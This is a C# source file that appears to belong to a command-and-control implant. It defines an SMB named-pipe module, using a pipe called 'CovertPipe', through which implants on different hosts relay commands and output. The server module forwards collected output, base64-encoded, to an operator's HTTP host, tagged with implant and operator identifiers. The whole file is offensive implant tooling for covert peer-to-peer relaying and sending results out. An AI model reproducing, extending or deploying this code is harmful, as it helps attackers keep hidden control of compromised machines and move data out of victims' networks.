using System;
using System.IO;
using System.IO.Pipes;
using System.Net;
using System.Threading;
using System.Threading.Tasks;
using HTTPImplant.Modules;
using HTTPImplant;
using System.Text;
using System.Runtime.Serialization.Json;

namespace SMBImplant.Modules
{
    public class SMBServer
    {
        private const string PipeName = "CovertPipe";
        private static byte[] commandBuffer;
        private static byte[] outputBuffer;
        private static readonly object commandBufferLock = new object();
        private static readonly object outputBufferLock = new object();

        public static void StartServer(string httpHost, string httpPort, string implantId, string operatorName)
        {
            Task.Run(() =>
            {
                using (var pipeServer = new NamedPipeServerStream(PipeName, PipeDirection.InOut, NamedPipeServerStream.MaxAllowedServerInstances, PipeTransmissionMode.Byte, PipeOptions.Asynchronous))
                {
                    Console.WriteLine("Waiting for client connection...");
                    pipeServer.WaitForConnection();
                    Console.WriteLine("Client connected.");

                    HandleClient(pipeServer, httpHost, httpPort, implantId, operatorName);
                }
            });
        }

        private static void HandleClient(NamedPipeServerStream pipeStream, string host, string port, string implantId, string operatorId)
        {
            try
            {
                var buffer = new byte[4096];
                int bytesRead;

                while ((bytesRead = pipeStream.Read(buffer, 0, buffer.Length)) > 0)
                {
                    lock (outputBufferLock)
                    {
                        outputBuffer = new byte[bytesRead];
                        Array.Copy(buffer, outputBuffer, bytesRead);
                    }
                }

                HTTP.SendResult(host, port, implantId, operatorId, Convert.ToBase64String(outputBuffer));
            }
            catch (Exception ex)
            {
                Console.WriteLine("Error: " + ex.Message);
            }
        }

        public static void StoreCommand(Command command)
        {
            lock (commandBufferLock)
            {
                DataContractJsonSerializer serializer = new DataContractJsonSerializer(typeof(Command));
                using (MemoryStream ms = new MemoryStream())
                {
                    serializer.WriteObject(ms, command);
                    commandBuffer = ms.ToArray();
                }
            }
        }

        public static Command RetrieveCommand()
        {
            lock (commandBufferLock)
            {
                if (commandBuffer == null)
                {
                    return null;
                }

                DataContractJsonSerializer serializer = new DataContractJsonSerializer(typeof(Command));
                using (MemoryStream ms = new MemoryStream(commandBuffer))
                {
                    Command command = (Command)serializer.ReadObject(ms);
                    commandBuffer = null; // Clear the buffer after retrieving
                    return command;
                }
            }
        }

        public static byte[] RetrieveOutput()
        {
            lock (outputBufferLock)
            {
                var output = outputBuffer;
                outputBuffer = null; // Clear the buffer after retrieving
                return output;
            }
        }
    }

    public class SMBClient
    {
        private const string PipeName = "CovertPipe";

        public static void SendData(string data, string ServerName)
        {
            try
            {
                using (var pipeClient = new NamedPipeClientStream(ServerName, PipeName, PipeDirection.Out))
                {
                    pipeClient.Connect(5000); // Timeout for connecting to the pipe
                    byte[] buffer = Encoding.UTF8.GetBytes(data);
                    pipeClient.Write(buffer, 0, buffer.Length);
                    pipeClient.Flush();
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine("Error sending data: " + ex.Message);
            }
        }

        public static string ReadCommandFromSMB(string ServerName)
        {
            try
            {
                using (var pipeClient = new NamedPipeClientStream(ServerName, PipeName, PipeDirection.In))
                {
                    pipeClient.Connect(5000); // Timeout for connecting to the pipe

                    using (var sr = new StreamReader(pipeClient))
                    {
                        return sr.ReadToEnd();
                    }
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine("Error reading from SMB: " + ex.Message);
                return null;
            }
        }
    }
}
